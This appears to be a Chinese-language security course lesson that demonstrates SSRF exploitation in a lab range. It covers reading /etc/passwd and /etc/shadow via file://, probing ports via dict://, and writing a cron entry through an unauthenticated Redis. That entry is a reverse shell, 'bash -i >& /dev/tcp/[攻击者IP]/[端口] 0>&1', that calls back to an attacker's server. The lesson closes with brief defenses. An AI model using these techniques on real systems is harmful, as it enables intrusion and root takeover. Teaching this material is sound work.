# 网络安全系统教学合集：P79：13.SSRF漏洞的利用

![](img/f2fa28f66e784628612f24ae0f16c7db_0.png)

![](img/f2fa28f66e784628612f24ae0f16c7db_0.png)

在本节课中，我们将要学习SSRF漏洞的利用。SSRF是服务器端请求伪造，它允许攻击者诱使服务器向内部或外部的任意地址发起请求。本节将详细介绍SSRF漏洞的三种主要利用方式，并通过靶场环境进行演示。

## SSRF漏洞的作用

SSRF漏洞主要有三个作用。以下是具体介绍。

### 1. 读取敏感文件

SSRF可以访问原本无法直接访问的内网，从而读取内网中的敏感文件。

常用的读取文件协议是 **file协议**。file协议是本地文件传输协议，用于访问本地计算机中的文件。其格式为 `file://` 后接文件路径。

例如，我们使用一个搭建好的存在SSRF漏洞的靶场进行演示。攻击是非法的，因此我们仅在靶场环境中操作。

![](img/f2fa28f66e784628612f24ae0f16c7db_2.png)

假设靶场存在SSRF漏洞，我们可以使用file协议查看文件。格式如下：
```
file:///etc/hosts
```
这里有三个斜杠。前两个斜杠是file协议自带的，第三个斜杠是 `/etc` 目录的路径分隔符。

![](img/f2fa28f66e784628612f24ae0f16c7db_2.png)

通过请求，我们能够看到目标主机的 `/etc/hosts` 文件内容。这说明服务器为我们转发了请求。

常见的重要文件包括 `/etc/passwd`、`/etc/shadow`、`/etc/hosts` 等。
*   `/etc/hosts` 文件配置了域名与IP地址的对应关系。通过它，我们可以发现内网IP段，例如 `172.17.0.9`，进而可以对 `172.17.0.0/24` 这个C段进行探测。
*   我们还可以尝试查看 `/etc/passwd` 文件。

![](img/f2fa28f66e784628612f24ae0f16c7db_4.png)

这显示了 `/etc/passwd` 文件的内容，其中列出了系统用户。现代系统中，密码通常用 `x` 表示，真正的密码哈希值存储在 `/etc/shadow` 文件中。

![](img/f2fa28f66e784628612f24ae0f16c7db_4.png)

![](img/f2fa28f66e784628612f24ae0f16c7db_6.png)

尝试查看 `/etc/shadow` 文件。

![](img/f2fa28f66e784628612f24ae0f16c7db_6.png)

![](img/f2fa28f66e784628612f24ae0f16c7db_8.png)

![](img/f2fa28f66e784628612f24ae0f16c7db_9.png)

访问被拒绝。因为网站通常以 `www-data` 用户运行，而 `/etc/shadow` 文件只有 `root` 用户有读取权限。

![](img/f2fa28f66e784628612f24ae0f16c7db_8.png)

![](img/f2fa28f66e784628612f24ae0f16c7db_11.png)

![](img/f2fa28f66e784628612f24ae0f16c7db_9.png)

通过 `/etc/passwd` 文件，我们可以知道系统存在哪些用户。

![](img/f2fa28f66e784628612f24ae0f16c7db_11.png)

![](img/f2fa28f66e784628612f24ae0f16c7db_13.png)

![](img/f2fa28f66e784628612f24ae0f16c7db_13.png)

`/etc/shadow` 文件存储了真正的用户密码哈希值，只有 `root` 用户可读。虽然密码是哈希值，但仍然非常重要。在渗透测试或CTF比赛中，获取哈希值后可以在哈希碰撞网站尝试破解出明文。

以上就是利用SSRF查看内网文件的方法。Windows系统下同样可以查看文件，但我们的靶场搭建在Linux服务器上。

### 2. 探测内网服务

探测内网服务时，我们不再使用file协议，而是使用 **dict协议**。dict协议是一个字典网络协议，在SSRF中常用于探测目标服务器端口上运行的服务版本信息。

其格式为 `dict://` 后接IP地址和端口，例如 `dict://127.0.0.1:80`。

我们可以先用file协议读取 `/etc/hosts` 文件获取内网IP，再用dict协议探测这些IP上运行的服务。

例如，探测本地 `127.0.0.1` 是否开放了80端口。

### 3. 攻击内网应用

探测内网服务后，重点是利用这些服务进行攻击。一个典型的例子是攻击内网的 **Redis服务**。

![](img/f2fa28f66e784628612f24ae0f16c7db_52.png)

Redis是一个远程键值存储服务器，属于非关系型数据库。它与上节课讲的关系型数据库不同。

![](img/f2fa28f66e784628612f24ae0f16c7db_54.png)

Redis的特点是通常绑定在本地地址，默认不允许远程访问，因此默认没有设置密码。其默认端口是6379。

我们可以通过SSRF探测目标服务器是否安装了Redis服务。

![](img/f2fa28f66e784628612f24ae0f16c7db_56.png)

![](img/f2fa28f66e784628612f24ae0f16c7db_52.png)

运行探测命令。

![](img/f2fa28f66e784628612f24ae0f16c7db_58.png)

![](img/f2fa28f66e784628612f24ae0f16c7db_54.png)

发现有响应，说明存在Redis服务。由于Redis服务默认没有密码，可以直接被我们利用。

![](img/f2fa28f66e784628612f24ae0f16c7db_60.png)

![](img/f2fa28f66e784628612f24ae0f16c7db_56.png)

![](img/f2fa28f66e784628612f24ae0f16c7db_62.png)

Redis的安全性依赖于绑定在本地。如果攻击者能够操纵服务器本地向Redis发起访问，那么Redis就毫无安全性可言。

![](img/f2fa28f66e784628612f24ae0f16c7db_58.png)

![](img/f2fa28f66e784628612f24ae0f16c7db_64.png)

那么如何进行利用呢？接下来我们看看如何攻击内网应用。

![](img/f2fa28f66e784628612f24ae0f16c7db_66.png)

![](img/f2fa28f66e784628612f24ae0f16c7db_60.png)

一种方法是利用Redis设置定时任务。

![](img/f2fa28f66e784628612f24ae0f16c7db_62.png)

如何设置定时任务？我们使用一段攻击Payload。

![](img/f2fa28f66e784628612f24ae0f16c7db_64.png)

![](img/f2fa28f66e784628612f24ae0f16c7db_68.png)

首先，使用 `info` 命令查看目标Redis的信息。

![](img/f2fa28f66e784628612f24ae0f16c7db_66.png)

![](img/f2fa28f66e784628612f24ae0f16c7db_70.png)

info信息显示了Redis版本、操作系统（Linux）等，确认存在Redis服务。

接下来使用攻击Payload。注意：`flushall` 命令会清空数据库，请慎用，测试时也不要随意删除数据库。

我们要设置一个定时任务。定时任务类似于生活中的闹钟，在规定时间会自动执行某条命令。

![](img/f2fa28f66e784628612f24ae0f16c7db_72.png)

![](img/f2fa28f66e784628612f24ae0f16c7db_68.png)

![](img/f2fa28f66e784628612f24ae0f16c7db_73.png)

我们可以让被攻击机器在特定时间向攻击者控制的服务器发送连接，从而获取系统权限。

![](img/f2fa28f66e784628612f24ae0f16c7db_70.png)

![](img/f2fa28f66e784628612f24ae0f16c7db_75.png)

定时任务文件在不同系统上保存位置不同。在Linux系统中，通常位于 `/var/spool/cron/` 或 `/etc/cron*` 目录下。

![](img/f2fa28f66e784628612f24ae0f16c7db_72.png)

![](img/f2fa28f66e784628612f24ae0f16c7db_73.png)

根据之前info信息，目标系统可能是CentOS。我们可以先尝试一下。

![](img/f2fa28f66e784628612f24ae0f16c7db_75.png)

攻击步骤如下：
1.  设置Redis的工作目录为 `/var/spool/cron/`。
2.  创建一个定时任务文件（例如以root用户命名）。
3.  向该文件写入定时任务命令，内容为每分钟向攻击者IP和端口发送一个反弹shell。
4.  保存任务。
5.  在攻击者服务器上监听对应端口，等待连接。

执行设置工作目录的命令。

![](img/f2fa28f66e784628612f24ae0f16c7db_77.png)

执行创建文件并写入反弹shell命令的命令。命令格式大致如下，表示每分钟执行一次反弹shell：
```
* * * * * bash -i >& /dev/tcp/[攻击者IP]/[端口] 0>&1
```

![](img/f2fa28f66e784628612f24ae0f16c7db_79.png)

写入成功后保存。

![](img/f2fa28f66e784628612f24ae0f16c7db_77.png)

在攻击者服务器（例如IP为 `120.27.61.x`）上开启监听。

![](img/f2fa28f66e784628612f24ae0f16c7db_79.png)

监听端口与Payload中设置的端口保持一致（例如2333）。定时任务执行后，我们就能收到目标的连接。

现在监听器正在等待。我们稍后查看监听结果。

## SSRF漏洞的防御

如何防御SSRF漏洞？服务器请求伪造源于业务正常功能，不能直接关闭请求。问题在于攻击者伪造了恶意请求。因此，主要防御手段如下：

1.  **设置白名单**：限制服务器只能请求用户提交的URL白名单内的地址。
2.  **协议限制**：只允许发起HTTP/HTTPS等常见Web请求，禁止使用file、ftp、dict等危险协议。
3.  **过滤返回信息**：对服务器端返回给用户的信息进行严格过滤。尽量做到无回显，或统一错误信息，使SSRF难以被利用。

![](img/f2fa28f66e784628612f24ae0f16c7db_77.png)

看，我们已经收到了目标的连接。攻击者服务器显示获取了对方的shell，用户名是root，机器名是目标主机名。

![](img/f2fa28f66e784628612f24ae0f16c7db_79.png)

这样就实现了通过SSRF漏洞对内网机器的一次攻击演示。请注意，这仅是教学演示，并非真实攻击。

本节课中，我们一起学习了SSRF漏洞的三大利用方式：读取敏感文件、探测内网服务以及攻击内网应用（以Redis为例）。同时，也了解了针对SSRF漏洞的基本防御思路。理解这些原理对于进行安全防护和渗透测试都至关重要。
